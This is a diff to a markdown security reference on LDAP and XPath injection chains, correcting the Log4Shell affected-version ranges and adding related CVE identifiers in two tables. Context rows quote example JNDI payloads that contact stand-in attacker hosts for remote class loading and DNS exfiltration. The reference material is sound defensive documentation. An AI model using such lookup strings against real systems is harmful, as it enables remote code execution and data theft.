@@ -301,7 +301,7 @@ LDAP and XPath injections frequently serve as initial footholds that are chained
 | **JNDI LDAP lookup to remote class loading** | Injecting a JNDI reference (`${jndi:ldap://attacker/exploit}`) forces the JVM to connect to a malicious LDAP server that returns a Reference object pointing to an attacker-controlled codebase URL; the JVM loads and instantiates the remote class | Java application + JNDI enabled + no codebase restrictions (pre-JDK 8u191) | RCE |
 | **JNDI LDAP lookup with deserialization gadgets** | When remote class loading is restricted (JDK 8u191+), the malicious LDAP server returns a serialized Java object that triggers a deserialization gadget chain (e.g., Commons Collections) present on the target's classpath | Java application + JNDI enabled + vulnerable gadget on classpath | RCE |
 | **JNDI DNS exfiltration** | `${jndi:dns://attacker.com/data}` triggers DNS lookups that exfiltrate data as subdomain components, bypassing HTTP egress restrictions | Java application + JNDI enabled + DNS egress permitted | DISC |
-| **Log4Shell pattern** | User input logged via Log4j 2.x triggers JNDI lookup interpolation; LDAP serves as the protocol for delivering the exploit payload | Log4j 2.0–2.17.0 | RCE |
+| **Log4Shell pattern** | User input logged via Log4j 2.x triggers JNDI lookup interpolation; LDAP serves as the protocol for delivering the exploit payload | Log4j 2.0-beta9–2.14.1 (CVE-2021-44228, CVSS 10.0); incomplete fix bypass in 2.15.0 (CVE-2021-45046); DoS in ≤2.16.0 (CVE-2021-45105) | RCE |
 
 ### §9-2. XPath → XXE/XSLT Chain
 
@@ -347,7 +347,7 @@ LDAP and XPath injections frequently serve as initial footholds that are chained
 | §8-2 (commons-jxpath) | CVE-2024-36404 | GeoTools (<31.2, <30.4, <29.6) | 9.8 | RCE through XPath expression evaluation in library API |
 | §8-2 + §1-2 | CVE-2024-39565 | Juniper Junos OS J-Web (SRX/EX) | High | Unauthenticated XPath injection → remote command execution on network devices |
 | §8-2 (extension functions) | CVE-2024-31573 | XMLUnit for Java (<2.10.0) | — | XPath injection via XSLT extension functions |
-| §9-1 (JNDI + LDAP) | CVE-2021-44228 (Log4Shell) | Log4j 2.0–2.17.0 | 10.0 | JNDI/LDAP injection → RCE; one of the most impactful vulnerabilities in history |
+| §9-1 (JNDI + LDAP) | CVE-2021-44228 (Log4Shell) | Log4j 2.0-beta9–2.14.1 (RCE); bypass in 2.15.0 (CVE-2021-45046); DoS in ≤2.16.0 (CVE-2021-45105) | 10.0 | JNDI/LDAP injection → RCE; one of the most impactful vulnerabilities in history |
 | §1-1 + §7-1 | CVE-2024-37782 | Gladinet CentreStack | High | LDAP injection in username field → auth bypass + command execution |
 | §9-3 + §8-1 | CVE-2025-29810 | Active Directory Domain Services | 7.5 | LDAP injection → privilege escalation to SYSTEM |
 | LDAP protocol-level | CVE-2024-49112 | Windows LDAP Service | 9.8 | RCE via crafted LDAP requests (protocol-level, not filter injection) |
